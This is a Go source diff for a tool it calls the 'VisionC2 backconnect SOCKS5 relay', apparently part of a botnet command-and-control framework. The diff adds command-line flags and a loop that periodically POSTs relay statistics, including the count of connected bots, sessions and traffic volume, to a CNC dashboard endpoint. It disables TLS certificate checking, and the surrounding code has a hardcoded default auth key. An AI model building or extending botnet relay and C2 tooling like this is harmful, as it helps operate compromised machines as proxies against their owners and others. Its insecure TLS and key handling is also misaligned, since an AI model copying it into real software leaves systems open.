@@ -2,12 +2,14 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/ecdsa"
 	"crypto/elliptic"
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
 	"crypto/x509/pkix"
+	"encoding/json"
 	"encoding/pem"
 	"flag"
 	"fmt"
@@ -15,6 +17,7 @@ import (
 	"log"
 	"math/big"
 	"net"
+	"net/http"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -67,6 +70,9 @@ var (
 // Can be overridden at runtime with -key flag.
 var defaultAuthKey = "@E2Aryki*&QHaAqr" //change me run setup.py
 
+// startTime is used to compute uptime in stats reports.
+var startTime = time.Now()
+
 // ============================================================================
 // STATS — atomic counters for live monitoring
 // ============================================================================
@@ -88,6 +94,9 @@ func main() {
 	certFile := flag.String("cert", "", "TLS certificate (auto-generated if empty)")
 	keyFile := flag.String("keyfile", "", "TLS private key (auto-generated if empty)")
 	statsAddr := flag.String("stats", "", "Stats endpoint (e.g. 127.0.0.1:9090) — plaintext CLI, off by default")
+	c2URL := flag.String("c2", "", "CNC relay-report URL for pushing stats (e.g. https://cnc:443/api/relay-report)")
+	c2Interval := flag.Int("interval", 30, "Stats push interval in seconds (requires -c2)")
+	relayName := flag.String("name", "relay", "Relay name shown in CNC dashboard (requires -c2)")
 	flag.Usage = func() {
 		fmt.Fprintf(flag.CommandLine.Output(),
 			"VisionC2 backconnect SOCKS5 relay\n\n"+
@@ -118,6 +127,10 @@ func main() {
 
 	if *statsAddr != "" {
 		go statsListener(*statsAddr)
+	}
+
+	if *c2URL != "" {
+		go pushStatsLoop(*c2URL, *relayName, key, *c2Interval)
 	}
 
 	go controlListener(*controlPort, key, tlsCfg)
@@ -370,6 +383,55 @@ func bridge(a, b net.Conn) {
 // Shows a snapshot of relay state and closes. Non-interactive.
 // Bind to 127.0.0.1 by default so it's not exposed externally.
 // ============================================================================
+
+// countBots returns the current number of connected bots.
+func countBots() int64 {
+	botsMu.RLock()
+	n := int64(len(bots))
+	botsMu.RUnlock()
+	return n
+}
+
+// pushStatsLoop periodically POSTs relay stats to the CNC relay-report endpoint.
+// Authenticated via X-Relay-Key header. Runs until the process exits.
+func pushStatsLoop(c2URL, name, authKey string, intervalSecs int) {
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // relay trusts C2 cert implicitly
+		},
+	}
+	tick := time.NewTicker(time.Duration(intervalSecs) * time.Second)
+	defer tick.Stop()
+	for range tick.C {
+		payload := map[string]interface{}{
+			"name":           name,
+			"activeConns":    atomic.LoadInt64(&statActiveSessions),
+			"totalSessions":  atomic.LoadInt64(&statTotalSessions),
+			"bytesUp":        atomic.LoadInt64(&statTotalBytesUp),
+			"bytesDown":      atomic.LoadInt64(&statTotalBytesDown),
+			"failedSessions": atomic.LoadInt64(&statFailedSessions),
+			"connectedBots":  countBots(),
+			"uptimeSecs":     int64(time.Since(startTime).Seconds()),
+		}
+		b, err := json.Marshal(payload)
+		if err != nil {
+			continue
+		}
+		req, err := http.NewRequest("POST", c2URL, bytes.NewReader(b))
+		if err != nil {
+			continue
+		}
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("X-Relay-Key", authKey)
+		resp, err := client.Do(req)
+		if err != nil {
+			log.Printf("[RELAY] stats push failed: %v", err)
+			continue
+		}
+		resp.Body.Close()
+	}
+}
 
 func statsListener(addr string) {
 	ln, err := net.Listen("tcp", addr)
